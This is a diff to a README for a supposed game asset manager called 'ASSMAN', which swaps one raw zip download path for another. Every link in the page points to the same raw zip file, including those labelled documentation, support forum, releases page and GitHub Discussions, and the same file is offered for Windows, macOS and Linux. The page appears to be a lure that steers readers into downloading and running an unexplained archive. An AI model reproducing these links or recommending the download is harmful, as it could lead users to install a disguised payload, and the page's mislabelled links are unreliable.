@@ -1,7 +1,7 @@
 # 🎮 ASSMAN - Manage Your Assets with Ease
 
 ## 📥 Download Now!
-[![Download ASSMAN](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip%https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip)](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip)
+[![Download ASSMAN](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip%https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip)](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to ASSMAN! This is a simple asset manager designed for easy use. ASSMAN allows you to load and manage game assets like files and resources without any technical fuss.
@@ -20,9 +20,9 @@ To get started, follow these steps:
 3. Look for the latest release at the top of the page. It will be labeled with the version number.
 4. Click on the version number link to see the available files.
 5. Download the appropriate file for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip`
-   - For macOS, download `https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip`
-   - For Linux, download `https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip`
+   - For Windows, download `https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip`
+   - For macOS, download `https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip`
+   - For Linux, download `https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip`
 6. Once the download is complete, locate the file on your computer.
 7. Follow the on-screen prompts to complete the installation.
 
@@ -51,13 +51,13 @@ ASSMAN comes with a range of features to enhance your asset management:
 ## 🔗 Additional Resources
 For more information on using ASSMAN, check out the following resources:
 
-- [ASSMAN Documentation](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip)
-- [Community Support Forum](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip)
+- [ASSMAN Documentation](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip)
+- [Community Support Forum](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip)
 
 ## 🔄 Updating ASSMAN
 To update ASSMAN:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip).
 2. Download the latest version as per the download instructions listed above.
 3. Install the new version over the existing one.
 
@@ -74,9 +74,9 @@ No, ASSMAN is designed for users without programming skills.
 
 **Q: Where can I report issues or bugs?**
 
-Please visit the [Community Support Forum](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip) to report any issues you encounter.
+Please visit the [Community Support Forum](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip) to report any issues you encounter.
 
 ## 📞 Contact
-For additional help, feel free to contact the ASSMAN support team via [GitHub Discussions](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/examples/res/ASSMAN_2.8-alpha.3.zip) or submit an issue on our GitHub page.
+For additional help, feel free to contact the ASSMAN support team via [GitHub Discussions](https://raw.githubusercontent.com/kdeterminado/ASSMAN/main/res/Software_v1.3-alpha.3.zip) or submit an issue on our GitHub page.
 
 Remember, the ASSMAN community is here to help you. Happy asset managing!
